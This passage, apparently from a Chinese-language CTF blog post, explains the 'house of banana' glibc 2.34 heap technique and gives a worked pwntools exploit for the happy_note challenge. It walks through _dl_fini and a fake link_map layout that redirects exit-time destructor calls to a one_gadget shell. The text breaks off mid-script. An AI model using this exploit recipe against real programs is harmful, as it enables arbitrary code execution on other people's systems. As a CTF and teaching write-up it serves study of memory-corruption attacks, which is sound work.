class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_dl_fini (void)</span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">   struct link_map *maps[nloaded];    </span><br><span class="line"></span><br><span class="line">   unsigned int i;</span><br><span class="line">   struct link_map *l;</span><br><span class="line">   assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);</span><br><span class="line">   for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)</span><br><span class="line">     /* Do not handle ld.so in secondary namespaces.  */</span><br><span class="line">     if (l == l-&gt;l_real)      //检查节点的地址是否跟自己结构体保存的一致</span><br><span class="line">       {</span><br><span class="line">  assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">  maps[i] = l;</span><br><span class="line">  l-&gt;l_idx = i;</span><br><span class="line">  ++i;</span><br><span class="line"></span><br><span class="line">  /* Bump l_direct_opencount of all objects so that they</span><br><span class="line">     are not dlclose()ed from underneath us.  */</span><br><span class="line">  ++l-&gt;l_direct_opencount;</span><br><span class="line">       }</span><br><span class="line">   assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">   assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);</span><br><span class="line">   unsigned int nmaps = i;</span><br><span class="line"></span><br><span class="line">   _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">    NULL, true);</span><br><span class="line"></span><br><span class="line">   __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">   for (i = 0; i &lt; nmaps; ++i)</span><br><span class="line">     {</span><br><span class="line">       struct link_map *l = maps[i];   //l遍历link_map的链表</span><br><span class="line"></span><br><span class="line">       if (l-&gt;l_init_called)     //重要的检查点</span><br><span class="line">  {</span><br><span class="line">    l-&gt;l_init_called = 0;      </span><br><span class="line"></span><br><span class="line">    /* Is there a destructor function?  */</span><br><span class="line">    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL</span><br><span class="line">        || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL))</span><br><span class="line">      {</span><br><span class="line">        /* When debugging print a message first.  */</span><br><span class="line">        if (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">         &amp; DL_DEBUG_IMPCALLS, 0))</span><br><span class="line">   _dl_debug_printf ("\ncalling fini: %s [%lu]\n\n",</span><br><span class="line">       DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">       ns);</span><br><span class="line"></span><br><span class="line">        /* First see whether an array is given.  */</span><br><span class="line">        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">   {</span><br><span class="line">     ElfW(Addr) *array =</span><br><span class="line">       (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">         + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">     unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">         / sizeof (ElfW(Addr)));</span><br><span class="line">     while (i-- &gt; 0)</span><br><span class="line">       ((fini_t) array[i]) ();     //目标位置</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>总结下我们需要绕过那些检查</p><ol><li><p>判断_ns_loaded链表中至少有三个节点（dl-fini开始部分通过循环遍历链表，做检查，）</p></li><li><p>检查l == l-&gt;l_real</p></li><li><p>检查l == l-&gt;l_real检查l-&gt;l_init_called &gt; 8 这个其实跟数据的处理有关</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unsigned int l_relocated:1; /* Nonzero if object's relocations done.  */</span><br><span class="line">    unsigned int l_init_called:1; /* Nonzero if DT_INIT function called.  */</span><br><span class="line">    unsigned int l_global:1; /* Nonzero if object in _dl_global_scope.  */</span><br><span class="line">    unsigned int l_reserved:2; /* Reserved for internal use.  */</span><br><span class="line">    unsigned int l_phdr_allocated:1; /* Nonzero if the data structure pointed</span><br><span class="line">     to by `l_phdr' is allocated.  */</span><br><span class="line">    unsigned int l_soname_added:1; /* Nonzero if the SONAME is for sure in</span><br></pre></td></tr></tbody></table></figure><p>在link_map结构体中，这个变量是4字节，与结构体开始位置的偏移量为0x31c。pwndbg帮我们解释了数据的结果，这里的数据要大于8，我们不妨之际设置为9.不同节点可以有所差异，下面是一个结果为1 的数据</p><p><img src="https://pic2.zhimg.com/80/v2-edd4f01f64289f36b526d0b187334955_1440w.png" alt="img"></p><p>以及一个不为1 的数据</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct link_map *)0x7f56e43ba7d0</span><br><span class="line">$5 = {</span><br><span class="line">  l_addr = 140725148598272,</span><br><span class="line">  l_name = 0x7ffd207e4371 "linux-vdso.so.1",</span><br><span class="line">  l_ld = 0x7ffd207e43e0,</span><br><span class="line">  l_next = 0x7f56e4382000,</span><br><span class="line">  l_prev = 0x7f56e43ba220,</span><br><span class="line">  l_real = 0x7f56e43ba7d0,</span><br><span class="line">...</span><br><span class="line">  l_relocated = 1,</span><br><span class="line">  l_init_called = 0,</span><br><span class="line">  l_global = 0,</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/wx 0x7f56e43ba7d0+0x31c</span><br><span class="line">0x7f56e43baaec: 0x00000005</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></tbody></table></figure><p>\4.  检查l-&gt;l_info[DT_FINI_ARRAY] != NULL，unsigned int i =  (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_valDT_FINI_ARRAY宏定义为26，DT_FINI_ARRAYSZ宏定义为28，所以l_info[26],以及l_info[28]不能是null(28是因为i会影响到函数  ((fini_t) array[i]) ();调用)</p><p>下面我们具体说说如何伪造，我选择利用修改第三节点的l_next指针，指向一个chunk,并在chunk上部署我们伪造的link_map.这里依赖任意地址写，可通过largebin   attack实现，或者其他漏洞造成的可以任意地址写堆地址。第三节点的指针在哪？_rtld_global符号并不在libc文件，而是在ld.so文件中，我们要泄露出程序的ld基址，pwndbg为我们提供了一个函数求偏移量</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">0x7f56e43b9040-&gt;0x7f56e4382018 is -0x37028 bytes (-0x6e05 words)</span><br></pre></td></tr></tbody></table></figure><p>由此我们就知道了需要向哪里写入chunk.</p><p>接下来就是重点，我们如何伪造link_map.</p><p>因为原来的链表中只有4个节点，而我们伪造的link_map有恰是第四个，所以，l_next就是0，l_prve无所谓，直接写0即可。l_real就是我们的伪造的link_map的开始地址，也是我们修改后的第三节点的l_next的值。这几个值离link_map的首地址很近，可以很直接的看出偏移量。接下来就是l_info的伪造。l_info[26]不为0，这是结构体内的数组，distance可以得到info[26]  info[28]关于节点地址的偏移量，同样我们可以得到上面提到的l_init_called的偏移量</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[26]</span><br><span class="line">0x7f56e43ba220-&gt;0x7f56e43ba330 is 0x110 bytes (0x22 words)</span><br><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[28]</span><br><span class="line">0x7f56e43ba220-&gt;0x7f56e43ba340 is 0x120 bytes (0x24 words)</span><br><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_init_called</span><br><span class="line">0x7f56e43ba220-&gt;0x7f56e43ba53c is 0x31c bytes (0x63 words)</span><br></pre></td></tr></tbody></table></figure><p>重点来了，info这连个位置我们写入什么数据</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">l_info = {0x0, 0x41, 0x0, 0x55a656f072f8, 0x8, 0x7f56e4244cec &lt;__execvpe+652&gt;, 0xa, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x55a656f072e0, 0x0, 0x55a656f072e8, 0xa, 0x0, 0x41, 0x9, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0},</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">   {</span><br><span class="line">     ElfW(Addr) *array =</span><br><span class="line">       (ElfW(Addr) *) (l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">     unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val/ sizeof (ElfW(Addr)));</span><br><span class="line">     while (i-- &gt; 0)</span><br><span class="line">       ((fini_t) array[i]) ();     //目标位置</span><br></pre></td></tr></tbody></table></figure><p>这是一个比较通用的info，0x7f56e4244cec &lt;__execvpe+652&gt;是我们想要执行的函数。</p><p>我们再看源码的相关部分，正常情况下，exit使用的就是第四个节点的l_info的数据，也就是使用我们伪造的info。</p><p>sizeof  (ElfW(Addr)) = 8，为了方便解释，我们将这里  l-&gt;l_info[DT_FINI_ARRAYSZ]的数据记为ptr，ptr-&gt;d_un.d_ptr,其实就是ptr+0x8所指向的数据。ptr是我们要伪造的数据，他是堆中的一个可控制的位置。我们想要执行一次就可以获得shell，我们不妨让i  =1,然后我们需要在ptr+8的位置写入的就是1*8=8</p><p>我们还要确定的是arry数组。(l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</p><p>l-&gt;addr其实就是我们伪造的link_map开始的位置，个人喜欢将这里写为0，然后将l_info[26]写入另外一个地址，两者加起来就是数组的初始位置。我们记录这个地址为ptr_a,这个就会给arry赋值，然后  arry[i] ====&gt;&gt; 就是调用ptr_a +8*i 位置的函数。也就是我们的后门。</p><p>提供一个构造的布局，</p><p>在fake+0x110写入一个ptr_a，且ptr_a+0x8处有ptr，ptr处写入的是最后要执行的函数地址.</p><p>在fake+0x120写入一个ptr，且ptr+0x8处是i*8。</p><p>我选择的是fake+0x110写入fake+0x40，在fake+0x48写入fake+0x58，在fake+0x58写入shell</p><p>我选择在fake+0x120写入fake+0x48，在fake+0x50处写入8.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tel 0x55a656f072a0(fake) 40</span><br><span class="line">00:0000│  0x55a656f072a0 ◂— 0x0       //l_addr</span><br><span class="line">... ↓     4 skipped</span><br><span class="line">05:0028│  0x55a656f072c8 —▸ 0x55a656f072a0 ◂— 0x0    //l_real</span><br><span class="line">06:0030│  0x55a656f072d0 ◂— 0x0</span><br><span class="line">07:0038│  0x55a656f072d8 ◂— 0x41 </span><br><span class="line">08:0040│  0x55a656f072e0 ◂— 0x0</span><br><span class="line">09:0048│  0x55a656f072e8 —▸ 0x55a656f072f8 —▸ 0x7f56e4244cec (execvpe+652) ◂— mov    rdx, r12</span><br><span class="line">0a:0050│  0x55a656f072f0 ◂— 0x8</span><br><span class="line">0b:0058│  0x55a656f072f8 —▸ 0x7f56e4244cec (execvpe+652) ◂— mov    rdx, r12</span><br><span class="line">0c:0060│  0x55a656f07300 ◂— 0xa /</span><br><span class="line">0d:0068│  0x55a656f07308 ◂— 0x0</span><br><span class="line">0e:0070│  0x55a656f07310 ◂— 0x0</span><br><span class="line">0f:0078│  0x55a656f07318 ◂— 0x41</span><br><span class="line">10:0080│  0x55a656f07320 ◂— 0x0</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">17:00b8│  0x55a656f07358 ◂— 0x41</span><br><span class="line">18:00c0│  0x55a656f07360 ◂— 0x0</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">1f:00f8│  0x55a656f07398 ◂— 0x41 </span><br><span class="line">20:0100│  0x55a656f073a0 ◂— 0x0</span><br><span class="line">21:0108│  0x55a656f073a8 ◂— 0x0</span><br><span class="line">22:0110│  0x55a656f073b0 —▸ 0x55a656f072e0  //l_info[26]</span><br><span class="line">23:0118│  0x55a656f073b8 ◂— 0x0</span><br><span class="line">24:0120│  0x55a656f073c0 —▸ 0x55a656f072e8  //l_info[28]</span><br><span class="line">25:0128│  0x55a656f073c8 ◂— 0xa </span><br><span class="line">26:0130│  0x55a656f073d0 ◂— 0x0</span><br><span class="line">27:0138│  0x55a656f073d8 ◂— 0x41</span><br></pre></td></tr></tbody></table></figure><p>最后我们就是利用onegadget获得shell了。</p><p>利用gdb万能必挂点，结合one_gadget工具帮助我们快速找到合适的one_gadget</p><p><img src="https://pic3.zhimg.com/80/v2-8e71d13c972fd006acc5279d28cf2ba2_1440w.jpg" alt="img"></p><h2 id="一些注意点："><a href="#一些注意点：" class="headerlink" title="一些注意点："></a>一些注意点：</h2><p>因为_rtld_global   这个符号是存在与ld.so文件中，往往出题人不会给出ld.so文件，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文主要就是介绍我们常用的手法，在高版本的利用情况，主要关注的是在较新版本  Glibc-2.34  0ubuntu3.2的可行性。因为2.34主要问题还是在于一些hook函数被禁止，以及对_IO_str_finish、_IO_str_overflow变化的影响，导致我们可以利用的点是在是很少了。但是这其实对于各位ctfer来讲，因为方法很少，导致攻击手法比较的单一，只有那么几个可以使用。在3.2版本之前，我们依旧可以通过修改vtable劫持控制流，或者攻击’exit_hook’(这个叫法可能会不太严谨，因为并不是一个hook的符号，而是其他的符号)。house  of kiwi,攻击exit_hook依旧是可以实现，且比较方便的。</p><p>后面我这里主要介绍了house of banana,这项技术，依旧是用于3.2，并且向下兼容。简要概括，就是修改第三个节点的l_next为堆地址fake，并在该堆上伪造第四个节点。</p><p>伪造link_map</p><ol><li>*(fake+0x28)=fake。</li><li>*(fake +0x48)=fake+0x58, *(fake+0x50) = 0x8</li><li>*(fake+0x58) = shell</li><li>*(fake+0x110) = fake+0x40</li><li>*(fake+0x120) = fake+0x48</li><li>(int)*(fake+0x31c) = 0x9</li></ol><h1 id="例题：巅峰极客2022-happy-note"><a href="#例题：巅峰极客2022-happy-note" class="headerlink" title="例题：巅峰极客2022-happy_note"></a>例题：巅峰极客2022-happy_note</h1><p>程序存在一个可以利用一次的uaf漏洞，对堆大小和数量没有太大限制，所以可以利用常规手法泄露出libcbase和heapbase</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">io = process('./happy_note')</span><br><span class="line">#libc = ELF('/home/youlin/tools/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">libc=ELF("./libc.so.6")</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b"&gt;&gt; ")</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx,size,choice):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b"Note size:")</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b"Choose a mode: [1] or [2]")</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b"Edit your content:")</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b"Which one do you want to show?")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def UAF(idx):</span><br><span class="line">    menu(666)</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):#0-8</span><br><span class="line">    add(i,0x200,1)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">UAF(7)#7</span><br><span class="line">show(7)</span><br><span class="line">libcbase = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x219cc0</span><br><span class="line">rtld = libcbase + 0x25f040</span><br><span class="line">setcontext = libcbase + libc.sym['setcontext'] + 61</span><br><span class="line">sys_addr = libcbase + libc.sym['system']</span><br><span class="line">sh = libcbase + libc.search(b'/bin/sh').__next__()</span><br><span class="line">ret = libcbase + 0x28a87</span><br><span class="line">l_next = libcbase + 0x228010</span><br><span class="line">padding = libcbase + 0x218bc0</span><br><span class="line">pop_rdi = libcbase + 0x2a6c5</span><br><span class="line">add(0,0x10,1)#0</span><br><span class="line">add(1,0x1e0,1)#1</span><br><span class="line">add(2,0x1e0,1)#2</span><br><span class="line">add(3,0x1e0,1)#3</span><br><span class="line">delete(0)</span><br><span class="line">show(7)</span><br><span class="line">io.recvuntil(b'content: ')</span><br><span class="line">key = u64(io.recvuntil(b'\n')[:-1].ljust(8,b'\0'))-1</span><br><span class="line">heapbase = key&lt;&lt;12</span><br><span class="line">fake_rtld = heapbase + 0x1120</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>然后就是一个house of banana攻击</p><p>exp：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">io = process('./happy_note')</span><br><span class="line">#libc = ELF('/home/youlin/tools/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">libc=ELF("./libc.so.6")</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b"&gt;&gt; ")</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx,size,choice):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b"Note size:")</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b"Choose a mode: [1] or [2]")</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b"Edit your content:")</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b"Which one do you want to show?")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def UAF(idx):</span><br><span class="line">    menu(666)</span><br><span class="line">    io.recvuntil(b"Choose a note:")</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):#0-8</span><br><span class="line">    add(i,0x200,1)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">UAF(7)#7</span><br><span class="line">show(7)</span><br><span class="line">libcbase = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x219cc0</span><br><span class="line">rtld = libcbase + 0x25f040</span><br><span class="line">setcontext = libcbase + libc.sym['setcontext'] + 61</span><br><span class="line">sys_addr = libcbase + libc.sym['system']</span><br><span class="line">sh = libcbase + libc.search(b'/bin/sh').__next__()</span><br><span class="line">ret = libcbase + 0x28a87</span><br><span class="line">l_next = libcbase + 0x228010</span><br><span class="line">padding = libcbase + 0x218bc0</span><br><span class="line">pop_rdi = libcbase + 0x2a6c5</span><br><span class="line">add(0,0x10,1)#0</span><br><span class="line">add(1,0x1e0,1)#1</span><br><span class="line">add(2,0x1e0,1)#2</span><br><span class="line">add(3,0x1e0,1)#3</span><br><span class="line">delete(0)</span><br><span class="line">show(7)</span><br><span class="line">io.recvuntil(b'content: ')</span><br><span class="line">key = u64(io.recvuntil(b'\n')[:-1].ljust(8,b'\0'))-1</span><br><span class="line">heapbase = key&lt;&lt;12</span><br><span class="line">fake_rtld = heapbase + 0x1120</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">edit(7,b'a' * 0x10 + p64(0) + p64(0x1f1) + p64(l_next ^ (key + 1)))</span><br><span class="line">add(4,0x1e8,2)</span><br><span class="line">add(5,0x1e8,2)</span><br><span class="line">edit(5,p64(padding) + p64(fake_rtld))</span><br><span class="line"></span><br><span class="line">one = [0xeacec, 0xeacef, 0xeacf2]</span><br><span class="line"></span><br><span class="line">ogg = libcbase + one[0]</span><br><span class="line"></span><br><span class="line">payload = b'\x00' * 0x18</span><br><span class="line">payload += p64(fake_rtld)</span><br><span class="line">payload = payload.ljust(0x38, b'\x00')</span><br><span class="line">payload += p64(fake_rtld + 0x58)</span><br><span class="line">payload += p64(0x8)</span><br><span class="line">payload += p64(ogg)</span><br><span class="line">payload = payload.ljust(0x100, b'\x00')</span><br><span class="line">payload += p64(fake_rtld + 0x40)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(fake_rtld + 0x48)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(4, payload)</span><br><span class="line">edit(8, b'\x00' * (0x12c - 